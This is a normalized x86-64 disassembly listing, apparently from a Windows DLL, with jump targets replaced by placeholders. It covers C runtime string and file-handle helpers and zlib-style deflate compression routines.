pop r13
pop r12
pop rdi
pop rsi
pop rbp
pop rbx
retn
mov rcx [ rw-data ]
cmp rcx rdi
je r-xdata
call rsi
test rax rax
je r-xdata
cmp rax rdi
je r-xdata
mov r11 [ rw-data ]
call [ DecodePointer@IAT ]
test rax rax
je r-xdata
bts ebp 0x15
jmp r-xdata
lea rcx [ rsp + 0x30 ]
mov r9d 0xc
lea r8 [ rsp + 0x38 ]
mov [ rsp + 0x20 ] rcx
lea edx [ r9 - 0xb ]
mov rcx rax
call r12
test eax eax
je r-xdata
mov rcx rbx
call rax
mov rbx rax
test [ rsp + 0x40 ] 0x1
jne r-xdata
sub_18000e0b8
push rbx
sub rsp 0x20
xor r10d r10d
mov r9 rcx
test rcx rcx
je r-xdata
call sub_180006ee4
mov ebx 0x16
test rdx rdx
je r-xdata
test r8 r8
jne r-xdata
cmp [ rcx ] r10w
je r-xdata
mov [ rcx ] r10w
test rdx rdx
jne r-xdata
add rcx 0x2
dec rdx
jne r-xdata
sub rcx r8
mov [ r9 ] r10w
jmp r-xdata
test rdx rdx
jne r-xdata
dec rdx
jne r-xdata
xor eax eax
jmp r-xdata
mov [ r9 ] r10w
call sub_180006ee4
mov ebx 0x22
jmp r-xdata
movzx eax [ r8 ]
mov [ rcx + r8 ] ax
add r8 0x2
test ax ax
je r-xdata
add rsp 0x20
pop rbx
retn
mov [ rax ] ebx
call sub_180008e08
mov eax ebx
sub_18000e140
push rbx
sub rsp 0x20
xor ebx ebx
mov r10 r8
test r9 r9
jne r-xdata
test rcx rcx
je r-xdata
test rcx rcx
jne r-xdata
call sub_180006ee4
mov ebx 0x16
test rdx rdx
je r-xdata
test rdx rdx
jne r-xdata
test r9 r9
jne r-xdata
xor eax eax
jmp r-xdata
test r8 r8
jne r-xdata
mov [ rcx ] bx
jmp r-xdata
add rsp 0x20
pop rbx
retn
mov r11 rcx
mov r8 rdx
cmp r9 0xffffffffffffffff
jne r-xdata
mov [ rcx ] bx
sub r10 rcx
sub r11 r10
test r9 r9
jne r-xdata
dec r8
je r-xdata
test r8 r8
jne r-xdata
dec r8
jne r-xdata
mov [ r11 ] bx
dec r9
jne r-xdata
cmp r9 0xffffffffffffffff
jne r-xdata
movzx eax [ r10 ]
mov [ r11 + r10 ] ax
add r10 0x2
test ax ax
je r-xdata
jmp r-xdata
movzx eax [ r10 + r11 ]
mov [ r11 ] ax
add r11 0x2
test ax ax
je r-xdata
mov [ rcx ] bx
call sub_180006ee4
mov ebx 0x22
jmp r-xdata
mov [ rcx + rdx * 2 - 0x2 ] bx
lea eax [ r8 + 0x50 ]
jmp r-xdata
mov [ rax ] ebx
call sub_180008e08
mov eax ebx
sub_18000e22c
push rbx
sub rsp 0x20
xor r10d r10d
mov r9 rcx
test rcx rcx
je r-xdata
call sub_180006ee4
mov ebx 0x16
test rdx rdx
je r-xdata
test r8 r8
jne r-xdata
sub rcx r8
mov [ rcx ] r10w
test rdx rdx
jne r-xdata
dec rdx
jne r-xdata
xor eax eax
jmp r-xdata
mov [ r9 ] r10w
call sub_180006ee4
mov ebx 0x22
jmp r-xdata
movzx eax [ r8 ]
mov [ rcx + r8 ] ax
add r8 0x2
test ax ax
je r-xdata
add rsp 0x20
pop rbx
retn
mov [ rax ] ebx
call sub_180008e08
mov eax ebx
sub_18000e298
sub rsp 0x28
test ecx ecx
js r-xdata
call sub_180006ee4
mov [ rax ] 0x16
call sub_180008e08
or eax 0xffffffff
cmp ecx 0x2
jle r-xdata
mov eax [ rw-data ]
mov [ rw-data ] ecx
jmp r-xdata
cmp ecx 0x3
jne r-xdata
add rsp 0x28
retn
mov eax [ rw-data ]
jmp r-xdata
sub_18000e2d8
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rsi
push rdi
sub rsp 0x30
xor edi edi
lea ecx [ rdi + 0x1 ]
call sub_18000c3c4
nop
lea ebx [ rdi + 0x3 ]
mov ecx 0x1
call sub_18000c2c4
mov eax edi
mov rbx [ rsp + 0x40 ]
mov rsi [ rsp + 0x48 ]
add rsp 0x30
pop rdi
retn
movsxd rsi ebx
mov rax [ rw-data ]
cmp [ rax + rsi * 8 ] 0x0
je r-xdata
inc ebx
jmp r-xdata
mov rcx [ rax + rsi * 8 ]
test [ rcx + 0x18 ] 0x83
je r-xdata
mov [ rsp + 0x20 ] ebx
cmp ebx [ rw-data ]
jge r-xdata
cmp ebx 0x14
jl r-xdata
call sub_1800073b8
cmp eax 0xffffffff
je r-xdata
mov rax [ rw-data ]
mov rcx [ rax + rsi * 8 ]
add rcx 0x30
call [ DeleteCriticalSection@IAT ]
mov rcx [ rw-data ]
mov rcx [ rcx + rsi * 8 ]
call sub_180006da4
mov r11 [ rw-data ]
and [ r11 + rsi * 8 ] 0x0
inc edi
mov [ rsp + 0x24 ] edi
sub_18000e384
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rbp
push rdi
sub rsp 0x20
test ecx ecx
js r-xdata
call sub_180006ee4
mov [ rax ] 0x9
call sub_180006f04
and [ rax ] 0x0
or eax 0xffffffff
cmp ecx [ rw-data ]
jae r-xdata
movsxd rbx ecx
lea rbp [ rw-data ]
mov rdi rbx
and ebx 0x1f
sar rdi 0x5
imul rbx rbx 0x58
mov rax [ rbp + rdi * 8 ]
test [ rax + rbx + 0x8 ] 0x1
je r-xdata
cmp [ rax + rbx ] 0xffffffffffffffff
je r-xdata
cmp [ rw-data ] 0x1
jne r-xdata
mov rax [ rbp + rdi * 8 ]
or [ rbx + rax ] 0xffffffffffffffff
xor eax eax
jmp r-xdata
test ecx ecx
je r-xdata
mov rbx [ rsp + 0x30 ]
mov rbp [ rsp + 0x38 ]
add rsp 0x20
pop rdi
retn
mov ecx 0xfffffff6
dec ecx
je r-xdata
mov ecx 0xfffffff5
jmp r-xdata
dec ecx
jne r-xdata
xor edx edx
call [ SetStdHandle@IAT ]
mov ecx 0xfffffff4
jmp r-xdata
sub_18000e430
sub rsp 0x28
cmp ecx 0xfffffffe
jne r-xdata
test ecx ecx
js r-xdata
call sub_180006f04
and [ rax ] 0x0
call sub_180006ee4
mov [ rax ] 0x9
jmp r-xdata
call sub_180006f04
and [ rax ] 0x0
call sub_180006ee4
mov [ rax ] 0x9
call sub_180008e08
cmp ecx [ rw-data ]
jae r-xdata
or rax 0xffffffffffffffff
movsxd rdx ecx
lea rcx [ rw-data ]
mov rax rdx
and edx 0x1f
sar rax 0x5
imul rdx rdx 0x58
mov rax [ rcx + rax * 8 ]
test [ rax + rdx + 0x8 ] 0x1
je r-xdata
mov rax [ rax + rdx ]
jmp r-xdata
add rsp 0x28
retn
sub_18000e4a4
mov rax rsp
mov [ rax + 0x8 ] rbx
mov [ rax + 0x10 ] rsi
mov [ rax + 0x18 ] rdi
mov [ rax + 0x20 ] r12
push r14
sub rsp 0x20
movsxd rbx ecx
mov r12 rbx
sar r12 0x5
lea r14 [ rw-data ]
and ebx 0x1f
imul rbx rbx 0x58
mov rsi [ r14 + r12 * 8 ]
mov edi 0x1
cmp [ rbx + rsi + 0xc ] 0x0
jne r-xdata
test edi edi
je r-xdata
lea ecx [ rdi + 0x9 ]
call sub_18000c3c4
nop
cmp [ rbx + rsi + 0xc ] 0x0
jne r-xdata
mov eax edi
mov rbx [ rsp + 0x30 ]
mov rsi [ rsp + 0x38 ]
mov rdi [ rsp + 0x40 ]
mov r12 [ rsp + 0x48 ]
add rsp 0x20
pop r14
retn
mov rcx [ r14 + r12 * 8 ]
lea rcx [ rcx + rbx + 0x10 ]
call [ EnterCriticalSection@IAT ]
mov ecx 0xa
call sub_18000c2c4
lea rcx [ rbx + rsi + 0x10 ]
mov edx 0xfa0
call [ InitializeCriticalSectionAndSpinCount@IAT ]
neg eax
sbb edx edx
and edi edx
inc [ rbx + rsi + 0xc ]
sub_18000e574
mov [ rsp + 0x18 ] rbx
mov [ rsp + 0x8 ] ecx
push rsi
push rdi
push r12
sub rsp 0x20
movsxd rdi ecx
cmp edi 0xfffffffe
jne r-xdata
test ecx ecx
js r-xdata
call sub_180006ee4
mov [ rax ] 0x9
jmp r-xdata
call sub_180006ee4
mov [ rax ] 0x9
call sub_180008e08
cmp edi [ rw-data ]
jae r-xdata
or eax 0xffffffff
mov rbx rdi
mov rsi rdi
sar rsi 0x5
lea r12 [ rw-data ]
and ebx 0x1f
imul rbx rbx 0x58
mov rax [ r12 + rsi * 8 ]
movsx ecx [ rax + rbx + 0x8 ]
and ecx 0x1
je r-xdata
mov ecx edi
call sub_18000e4a4
nop
mov rax [ r12 + rsi * 8 ]
test [ rax + rbx + 0x8 ] 0x1
je r-xdata
call sub_180006ee4
mov [ rax ] 0x9
or ebx 0xffffffff
mov ecx edi
call sub_18000e430
mov rcx rax
call [ FlushFileBuffers@IAT ]
test eax eax
jne r-xdata
mov rbx [ rsp + 0x50 ]
add rsp 0x20
pop r12
pop rdi
pop rsi
retn
xor ebx ebx
call [ GetLastError@IAT ]
mov ebx eax
jmp r-xdata
mov ecx edi
call sub_18000e54c
mov eax ebx
jmp r-xdata
call sub_180006f04
mov [ rax ] ebx
test ebx ebx
je r-xdata
sub_18000e64c
mov [ rsp + 0x8 ] cx
sub rsp 0x38
mov rcx [ rw-data ]
cmp rcx 0xfffffffffffffffe
jne r-xdata
cmp rcx 0xffffffffffffffff
jne r-xdata
call sub_18000e874
mov rcx [ rw-data ]
and [ rsp + 0x20 ] 0x0
lea r9 [ rsp + 0x48 ]
lea rdx [ rsp + 0x40 ]
mov r8d 0x1
call [ WriteConsoleW@IAT ]
test eax eax
je r-xdata
mov eax 0xffff
jmp r-xdata
movzx eax [ rsp + 0x40 ]
add rsp 0x38
retn
sub_18000e6a8
mov rax rsp
mov [ rax + 0x8 ] rbx
mov [ rax + 0x10 ] rsi
mov [ rax + 0x18 ] rdi
mov [ rax + 0x20 ] r12
push rbp
mov rbp rsp
sub rsp 0x50
xor r12d r12d
mov rsi r8
mov rdi rdx
mov rbx rcx
test rdx rdx
je r-xdata
xor eax eax
test r8 r8
je r-xdata
cmp [ rdx ] r12b
jne r-xdata
lea rcx [ rbp - 0x20 ]
mov rdx r9
call sub_18000643c
mov r11 [ rbp - 0x20 ]
cmp [ r11 + 0x14 ] r12d
jne r-xdata
test rcx rcx
je r-xdata
movzx ecx [ rdi ]
lea rdx [ rbp - 0x20 ]
call sub_18000bf08
test eax eax
je r-xdata
test rbx rbx
je r-xdata
mov [ rcx ] r12w
mov eax r12d
mov r9d 0x1
test rbx rbx
setne al
lea edx [ r9 + 0x8 ]
mov r8 rdi
mov [ rsp + 0x28 ] eax
mov rax [ rbp - 0x20 ]
mov [ rsp + 0x20 ] rbx
mov ecx [ rax + 0x4 ]
call [ MultiByteToWideChar@IAT ]
test eax eax
jne r-xdata
mov rcx [ rbp - 0x20 ]
mov r9d [ rcx + 0x10c ]
cmp r9d 0x1
jle r-xdata
cmp [ rbp - 0x8 ] r12b
je r-xdata
movzx eax [ rdi ]
mov [ rbx ] ax
jmp r-xdata
movsxd rax [ rcx + 0x10c ]
cmp rsi rax
jb r-xdata
cmp esi r9d
jl r-xdata
mov eax 0x1
jmp r-xdata
mov rax [ rbp - 0x10 ]
and [ rax + 0xc8 ] 0xfffffffd
call sub_180006ee4
mov [ rax ] 0x2a
cmp [ rbp - 0x8 ] r12b
je r-xdata
cmp [ rdi + 0x1 ] r12b
je r-xdata
mov ecx [ rcx + 0x4 ]
mov eax r12d
test rbx rbx
setne al
mov r8 rdi
mov edx 0x9
mov [ rsp + 0x28 ] eax
mov [ rsp + 0x20 ] rbx
call [ MultiByteToWideChar@IAT ]
mov rcx [ rbp - 0x20 ]
test eax eax
jne r-xdata
mov rbx [ rsp + 0x60 ]
mov rsi [ rsp + 0x68 ]
mov rdi [ rsp + 0x70 ]
mov r12 [ rsp + 0x78 ]
add rsp 0x50
pop rbp
retn
or eax 0xffffffff
jmp r-xdata
mov rax [ rbp - 0x10 ]
and [ rax + 0xc8 ] 0xfffffffd
mov eax [ rcx + 0x10c ]
cmp [ rbp - 0x8 ] r12b
je r-xdata
mov rcx [ rbp - 0x10 ]
and [ rcx + 0xc8 ] 0xfffffffd
jmp r-xdata
sub_18000e834
sub rsp 0x28
call sub_18000dbcc
test rax rax
je r-xdata
test [ rw-data ] 0x2
je r-xdata
mov ecx 0x16
call sub_18000dbdc
mov ecx 0x3
call sub_18000a94c
int3
mov r8d 0x1
mov edx 0x40000015
lea ecx [ r8 + 0x2 ]
call sub_180008c18
sub_18000e8ec
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rsi
push rdi
sub rsp 0x20
mov rdx [ rcx + 0x28 ]
mov rsi rcx
mov edi [ rdx + 0x28 ]
cmp edi [ rcx + 0x18 ]
cmova edi [ rcx + 0x18 ]
test edi edi
je r-xdata
mov rbx [ rsp + 0x30 ]
mov rsi [ rsp + 0x38 ]
add rsp 0x20
pop rdi
retn
mov rdx [ rdx + 0x20 ]
mov rcx [ rcx + 0x10 ]
mov r8d edi
mov ebx edi
call sub_180006a70
mov rax [ rsi + 0x28 ]
add [ rsi + 0x10 ] rbx
add [ rax + 0x20 ] rbx
add [ rsi + 0x1c ] edi
sub [ rsi + 0x18 ] edi
mov rax [ rsi + 0x28 ]
sub [ rax + 0x28 ] edi
mov rcx [ rsi + 0x28 ]
cmp [ rcx + 0x28 ] 0x0
jne r-xdata
mov rax [ rcx + 0x10 ]
mov [ rcx + 0x20 ] rax
sub_18000e960
mov rax rsp
mov [ rax + 0x8 ] rbx
mov [ rax + 0x10 ] rbp
mov [ rax + 0x18 ] rsi
mov [ rax + 0x20 ] rdi
push r12
push r13
push r14
push r15
mov r11d [ rcx + 0x8c ]
mov r9d [ rcx + 0x38 ]
mov r15 [ rcx + 0x48 ]
mov edi [ rcx + 0x9c ]
movsxd rbx [ rcx + 0x98 ]
mov ebp [ rcx + 0xb0 ]
lea eax [ r9 - 0x106 ]
mov esi edx
mov r10 rcx
lea r8 [ r11 + r15 ]
cmp r11d eax
jbe r-xdata
xor r11d r11d
sub r11d r9d
add r11d 0x106
jmp r-xdata
mov edx [ rcx + 0x94 ]
cmp ebp edx
cmova ebp edx
shr edi 0x2
mov r12b [ rbx + r8 - 0x1 ]
mov r13b [ rbx + r8 ]
lea r14 [ r8 + 0x102 ]
cmp ebx [ rcx + 0xac ]
jb r-xdata
mov ecx [ r10 + 0x40 ]
mov rax [ r10 + 0x58 ]
and rcx r9
movzx esi [ rax + rcx * 2 ]
cmp esi r11d
jbe r-xdata
cmp [ rax + rcx - 0x1 ] r12b
jne r-xdata
mov rbp [ rsp + 0x30 ]
mov rsi [ rsp + 0x38 ]
mov rdi [ rsp + 0x40 ]
cmp ebx edx
cmovbe edx ebx
mov rbx [ rsp + 0x28 ]
mov eax edx
pop r15
pop r14
pop r13
pop r12
retn
dec edi
jne r-xdata
mov al [ r8 ]
cmp [ rcx ] al
jne r-xdata
mov r9d esi
movsxd rax ebx
lea rcx [ r9 + r15 ]
cmp [ rax + rcx ] r13b
jne r-xdata
mov al [ r8 + 0x1 ]
cmp [ rcx + 0x1 ] al
jne r-xdata
add r8 0x2
add rcx 0x2
sub r8d r14d
lea eax [ r8 + 0x102 ]
lea r8 [ r14 - 0x102 ]
cdqe
cmp eax ebx
jle r-xdata
mov al [ rcx + 0x2 ]
inc r8
cmp [ r8 ] al
jne r-xdata
mov [ r10 + 0x90 ] esi
mov ebx eax
cmp eax ebp
jge r-xdata
mov al [ rcx + 0x3 ]
inc r8
cmp [ r8 ] al
jne r-xdata
mov r12b [ rax + r8 - 0x1 ]
mov r13b [ rax + r8 ]
mov al [ rcx + 0x4 ]
inc r8
cmp [ r8 ] al
jne r-xdata
mov al [ rcx + 0x5 ]
inc r8
cmp [ r8 ] al
jne r-xdata
mov al [ rcx + 0x6 ]
inc r8
cmp [ r8 ] al
jne r-xdata
mov al [ rcx + 0x7 ]
inc r8
cmp [ r8 ] al
jne r-xdata
add rcx 0x8
inc r8
mov al [ rcx ]
cmp [ r8 ] al
jne r-xdata
cmp r8 r14
jb r-xdata
mov al [ rcx + 0x1 ]
inc r8
cmp [ r8 ] al
jne r-xdata
sub_18000eaf4
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rbp
mov [ rsp + 0x18 ] rsi
push rdi
push r12
push r13
sub rsp 0x20
mov ebp [ rcx + 0x38 ]
mov rdi rcx
cmp ebx 0xffffffff
jne r-xdata
test edx edx
jne r-xdata
mov eax [ rdi + 0x38 ]
lea ecx [ rbp + rax - 0x106 ]
cmp edx ecx
jb r-xdata
mov ebx 0xfffffffe
jmp r-xdata
test eax eax
jne r-xdata
mov rsi [ rdi ]
cmp [ rsi + 0x8 ] 0x0
je r-xdata
mov rcx [ rdi + 0x48 ]
mov r8 rbp
lea rdx [ rcx + rbp ]
call sub_180006a70
mov r9d [ rdi + 0x6c ]
mov rax [ rdi + 0x60 ]
sub [ rdi + 0x90 ] ebp
sub [ rdi + 0x8c ] ebp
sub [ rdi + 0x7c ] ebp
lea r8 [ rax + r9 * 2 ]
mov ebx ebp
jmp r-xdata
mov rbx [ rsp + 0x40 ]
mov rbp [ rsp + 0x48 ]
mov rsi [ rsp + 0x50 ]
add rsp 0x20
pop r13
pop r12
pop rdi
retn
mov eax [ rdi + 0x8c ]
mov r13d [ rdi + 0x94 ]
add r13 rax
mov eax [ rsi + 0x8 ]
add r13 [ rdi + 0x48 ]
cmp eax ebx
mov r12d eax
cmova r12d ebx
test r12d r12d
je r-xdata
sub r8 0x2
xor eax eax
movzx edx [ r8 ]
movzx ecx dx
sub cx bp
cmp edx ebp
cmovae ax cx
dec r9d
mov [ r8 ] ax
jne r-xdata
mov rax [ rdi + 0x58 ]
mov r9d ebp
lea r8 [ rax + rbp * 2 ]
add [ rdi + 0x94 ] r12d
mov r9d [ rdi + 0x94 ]
cmp r9d 0x3
jb r-xdata
sub eax r12d
mov [ rsi + 0x8 ] eax
mov rax [ rsi + 0x28 ]
cmp [ rax + 0x2c ] 0x0
jne r-xdata
sub r8 0x2
xor eax eax
movzx edx [ r8 ]
movzx ecx dx
sub cx bp
cmp edx ebp
cmovae ax cx
dec r9d
mov [ r8 ] ax
jne r-xdata
add ebx ebp
cmp r9d 0x106
jae r-xdata
mov eax [ rdi + 0x8c ]
mov rdx [ rdi + 0x48 ]
mov ecx [ rdi + 0x78 ]
movzx r8d [ rax + rdx ]
mov [ rdi + 0x68 ] r8d
shl r8d cl
inc eax
movzx eax [ rax + rdx ]
xor r8d eax
and r8d [ rdi + 0x74 ]
mov [ rdi + 0x68 ] r8d
mov rdx [ rsi ]
mov r8d r12d
mov rcx r13
mov ebx r12d
call sub_180006a70
add [ rsi ] rbx
add [ rsi + 0xc ] r12d
mov rdx [ rsi ]
mov ecx [ rsi + 0x4c ]
mov r8d r12d
call sub_18000f688
mov [ rsi + 0x4c ] eax
mov rax [ rdi ]
cmp [ rax + 0x8 ] 0x0
jne r-xdata
mov edx [ rdi + 0x8c ]
mov ebx [ rdi + 0x50 ]
mov eax [ rdi + 0x94 ]
sub ebx edx
sub ebx eax
jne r-xdata
sub_18000eca4
mov rax rsp
mov [ rax + 0x8 ] rbx
mov [ rax + 0x10 ] rbp
mov [ rax + 0x18 ] rsi
mov [ rax + 0x20 ] rdi
push r12
sub rsp 0x20
mov eax [ rcx + 0x18 ]
mov r12d 0xffff
mov ebp edx
add eax 0xfffffffb
mov rbx rcx
mov esi 0x1
cmp eax r12d
cmovb r12d eax
xor edi edi
mov ecx [ rbx + 0x7c ]
add [ rbx + 0x8c ] eax
mov eax [ rbx + 0x8c ]
lea r8d [ rcx + r12 ]
mov [ rbx + 0x94 ] edi
je r-xdata
mov rcx rbx
call sub_18000eaf4
mov eax [ rbx + 0x94 ]
test eax eax
je r-xdata
sub eax r8d
mov [ rbx + 0x8c ] r8d
mov [ rbx + 0x94 ] eax
test ecx ecx
js r-xdata
cmp eax r8d
jb r-xdata
test ebp ebp
je r-xdata
mov rdx rdi
mov rdx rcx
add rdx [ rbx + 0x48 ]
jmp r-xdata
mov r8d [ rbx + 0x8c ]
mov eax [ rbx + 0x38 ]
sub r8d [ rbx + 0x7c ]
sub eax 0x106
cmp r8d eax
jb r-xdata
xor eax eax
cmp [ rbx + 0x7c ] edi
jl r-xdata
sub r8d ecx
xor r9d r9d
mov rcx rbx
call sub_180010c00
mov r11d [ rbx + 0x8c ]
mov rcx [ rbx ]
mov [ rbx + 0x7c ] r11d
call sub_18000e8ec
mov r11 [ rbx ]
cmp [ r11 + 0x18 ] edi
je r-xdata
mov eax [ rbx + 0x94 ]
cmp eax esi
ja r-xdata
cmp [ rbx + 0x7c ] edi
jl r-xdata
mov rdx rdi
mov edx [ rbx + 0x7c ]
add rdx [ rbx + 0x48 ]
jmp r-xdata
mov rdx rdi
mov edx [ rbx + 0x7c ]
add rdx [ rbx + 0x48 ]
jmp r-xdata
mov eax 0x3
cmp ebp 0x4
cmove esi eax
mov eax esi
jmp r-xdata
mov eax 0x2
cmp ebp 0x4
cmove edi eax
mov eax edi
jmp r-xdata
mov r8d [ rbx + 0x8c ]
mov r9d edi
cmp ebp 0x4
sete r9b
sub r8d [ rbx + 0x7c ]
mov rcx rbx
call sub_180010c00
mov r11d [ rbx + 0x8c ]
mov rcx [ rbx ]
mov [ rbx + 0x7c ] r11d
call sub_18000e8ec
mov r11 [ rbx ]
cmp [ r11 + 0x18 ] edi
jne r-xdata
xor r9d r9d
mov rcx rbx
call sub_180010c00
mov r11d [ rbx + 0x8c ]
mov rcx [ rbx ]
mov [ rbx + 0x7c ] r11d
call sub_18000e8ec
mov r11 [ rbx ]
cmp [ r11 + 0x18 ] edi
jne r-xdata
mov rbx [ rsp + 0x30 ]
mov rbp [ rsp + 0x38 ]
mov rsi [ rsp + 0x40 ]
mov rdi [ rsp + 0x48 ]
add rsp 0x20
pop r12
retn
sub_18000ee4c
mov rax rsp
mov [ rax + 0x8 ] rbx
mov [ rax + 0x10 ] rbp
mov [ rax + 0x18 ] rsi
mov [ rax + 0x20 ] rdi
push r12
push r13
push r15
sub rsp 0x20
xor edi edi
mov r12d edx
mov rbx rcx
lea esi [ rdi + 0x1 ]
lea r13d [ rdi + 0x3 ]
mov ebp edi
lea r15 [ __dos_header ]
cmp eax r13d
jb r-xdata
mov rcx rbx
call sub_18000eaf4
mov eax [ rbx + 0x94 ]
cmp eax 0x106
jae r-xdata
test ebp ebp
je r-xdata
mov rax [ rbx + 0x48 ]
mov r8d [ rbx + 0x8c ]
lea ecx [ r8 + 0x2 ]
movzx edx [ rcx + rax ]
mov eax [ rbx + 0x68 ]
mov ecx [ rbx + 0x78 ]
shl eax cl
xor edx eax
mov rax [ rbx + 0x60 ]
and edx [ rbx + 0x74 ]
mov ecx edx
mov [ rbx + 0x68 ] ecx
movzx ebp [ rax + rdx * 2 ]
mov ecx [ rbx + 0x40 ]
mov rax [ rbx + 0x58 ]
and rcx r8
mov [ rax + rcx * 2 ] bp
mov edx [ rbx + 0x68 ]
mov rcx [ rbx + 0x60 ]
movzx eax [ rbx + 0x8c ]
mov [ rcx + rdx * 2 ] ax
test eax eax
je r-xdata
test r12d r12d
je r-xdata
cmp [ rbx + 0x80 ] r13d
jb r-xdata
mov ecx [ rbx + 0x8c ]
mov eax [ rbx + 0x38 ]
sub ecx ebp
sub eax 0x106
cmp ecx eax
ja r-xdata
cmp [ rbx + 0x7c ] edi
jl r-xdata
mov r9d 0x2
xor eax eax
mov ecx [ rbx + 0x8c ]
mov rax [ rbx + 0x48 ]
mov r9d edi
movzx edx [ rcx + rax ]
mov ecx [ rbx + 0x16ec ]
mov rax [ rbx + 0x16f0 ]
mov [ rax + rcx * 2 ] di
mov ecx [ rbx + 0x16ec ]
mov rax [ rbx + 0x16e0 ]
mov [ rcx + rax ] dl
add [ rbx + 0x16ec ] esi
add [ rbx + rdx * 4 + 0xb4 ] si
mov eax [ rbx + 0x16e8 ]
sub eax esi
cmp [ rbx + 0x16ec ] eax
sete r9b
dec [ rbx + 0x94 ]
mov ecx [ rbx + 0x16ec ]
movzx r8d [ rbx + 0x8c ]
mov rax [ rbx + 0x16f0 ]
sub r8w [ rbx + 0x90 ]
mov dl [ rbx + 0x80 ]
mov [ rax + rcx * 2 ] r8w
mov rax [ rbx + 0x16e0 ]
mov ecx [ rbx + 0x16ec ]
sub dl r13b
mov [ rcx + rax ] dl
add [ rbx + 0x16ec ] esi
mov eax 0xffff
add r8w ax
movzx eax dl
movzx eax [ rax + r15 + 0x1a5c0 ]
add [ rbx + rax * 4 + 0x4b8 ] si
mov eax 0x100
cmp r8w ax
movzx eax r8w
jae r-xdata
cmp [ rbx + 0xa8 ] r9d
je r-xdata
mov rdx rdi
mov edx [ rbx + 0x7c ]
add rdx [ rbx + 0x48 ]
jmp r-xdata
mov eax [ rbx + 0x94 ]
cmp eax 0x106
jae r-xdata
cmp [ rbx + 0x7c ] edi
jl r-xdata
shr rax 0x7
movzx ecx [ rax + r15 + 0x1a4c0 ]
movzx ecx [ rax + r15 + 0x1a3c0 ]
jmp r-xdata
mov edx ebp
mov rcx rbx
call sub_18000e960
mov [ rbx + 0x80 ] eax
cmp r12d 0x4
cmove esi r13d
mov eax esi
jmp r-xdata
mov eax 0x2
cmp r12d 0x4
cmove edi eax
mov eax edi
jmp r-xdata
mov r8d [ rbx + 0x8c ]
mov r9d edi
cmp r12d 0x4
sete r9b
sub r8d [ rbx + 0x7c ]
mov rcx rbx
call sub_180010c00
mov r11d [ rbx + 0x8c ]
mov rcx [ rbx ]
mov [ rbx + 0x7c ] r11d
call sub_18000e8ec
mov r11 [ rbx ]
cmp [ r11 + 0x18 ] edi
jne r-xdata
mov rdx rdi
mov edx [ rbx + 0x7c ]
add rdx [ rbx + 0x48 ]
jmp r-xdata
add [ rbx + 0x8c ] eax
mov eax [ rbx + 0x8c ]
mov rdx [ rbx + 0x48 ]
mov ecx [ rbx + 0x78 ]
mov [ rbx + 0x80 ] edi
movzx r8d [ rax + rdx ]
mov [ rbx + 0x68 ] r8d
shl r8d cl
inc eax
movzx eax [ rax + rdx ]
xor r8d eax
and r8d [ rbx + 0x74 ]
mov [ rbx + 0x68 ] r8d
jmp r-xdata
cmp [ rbx + 0x94 ] r13d
jb r-xdata
movsxd rax ecx
mov r9d edi
add [ rbx + rax * 4 + 0x9a8 ] si
mov eax [ rbx + 0x16e8 ]
sub eax esi
cmp [ rbx + 0x16ec ] eax
mov eax [ rbx + 0x80 ]
sete r9b
sub [ rbx + 0x94 ] eax
cmp eax [ rbx + 0xa0 ]
ja r-xdata
mov rbx [ rsp + 0x40 ]
mov rbp [ rsp + 0x48 ]
mov rsi [ rsp + 0x50 ]
mov rdi [ rsp + 0x58 ]
add rsp 0x20
pop r15
pop r13
pop r12
retn
mov r9d 0x2
mov r8d [ rbx + 0x8c ]
xor r9d r9d
mov rcx rbx
sub r8d [ rbx + 0x7c ]
call sub_180010c00
mov r11d [ rbx + 0x8c ]
mov rcx [ rbx ]
mov [ rbx + 0x7c ] r11d
call sub_18000e8ec
mov r11 [ rbx ]
cmp [ r11 + 0x18 ] edi
jne r-xdata
test r9d r9d
mov r9d 0x2
je r-xdata
dec eax
mov [ rbx + 0x80 ] eax
add [ rbx + 0x8c ] esi
mov rax [ rbx + 0x48 ]
mov r8d [ rbx + 0x8c ]
lea ecx [ r8 + 0x2 ]
movzx edx [ rcx + rax ]
mov eax [ rbx + 0x68 ]
mov ecx [ rbx + 0x78 ]
shl eax cl
xor edx eax
mov rax [ rbx + 0x60 ]
and edx [ rbx + 0x74 ]
mov ecx edx
mov [ rbx + 0x68 ] ecx
movzx ebp [ rax + rdx * 2 ]
mov eax [ rbx + 0x40 ]
and r8 rax
mov rax [ rbx + 0x58 ]
mov [ rax + r8 * 2 ] bp
mov edx [ rbx + 0x68 ]
mov rcx [ rbx + 0x60 ]
movzx eax [ rbx + 0x8c ]
mov [ rcx + rdx * 2 ] ax
dec [ rbx + 0x80 ]
jne r-xdata
jmp r-xdata
add [ rbx + 0x8c ] esi
sub_18000f1f4
mov rax rsp
mov [ rax + 0x8 ] rbx
mov [ rax + 0x10 ] rbp
mov [ rax + 0x18 ] rsi
mov [ rax + 0x20 ] rdi
push r12
push r13
push r14
sub rsp 0x20
xor edi edi
mov ebp edx
mov rbx rcx
lea esi [ rdi + 0x1 ]
lea r14d [ rdi + 0x3 ]
lea r13d [ rdi + 0x2 ]
mov r12d edi
cmp eax r14d
jb r-xdata
mov rcx rbx
call sub_18000eaf4
mov eax [ rbx + 0x94 ]
cmp eax 0x106
jae r-xdata
mov ecx [ rbx + 0x80 ]
mov eax [ rbx + 0x90 ]
mov [ rbx + 0x80 ] r13d
mov [ rbx + 0x98 ] ecx
mov [ rbx + 0x84 ] eax
test r12d r12d
je r-xdata
mov rax [ rbx + 0x48 ]
mov r8d [ rbx + 0x8c ]
lea ecx [ r8 + 0x2 ]
movzx edx [ rcx + rax ]
mov eax [ rbx + 0x68 ]
mov ecx [ rbx + 0x78 ]
shl eax cl
xor edx eax
mov rax [ rbx + 0x60 ]
and edx [ rbx + 0x74 ]
mov ecx edx
mov [ rbx + 0x68 ] ecx
movzx r12d [ rax + rdx * 2 ]
mov ecx [ rbx + 0x40 ]
mov rax [ rbx + 0x58 ]
and rcx r8
mov [ rax + rcx * 2 ] r12w
mov edx [ rbx + 0x68 ]
mov rcx [ rbx + 0x60 ]
movzx eax [ rbx + 0x8c ]
mov [ rcx + rdx * 2 ] ax
test eax eax
je r-xdata
test ebp ebp
je r-xdata
mov eax [ rbx + 0x98 ]
cmp eax r14d
jb r-xdata
cmp ecx [ rbx + 0xa0 ]
jae r-xdata
cmp [ rbx + 0x88 ] edi
je r-xdata
xor eax eax
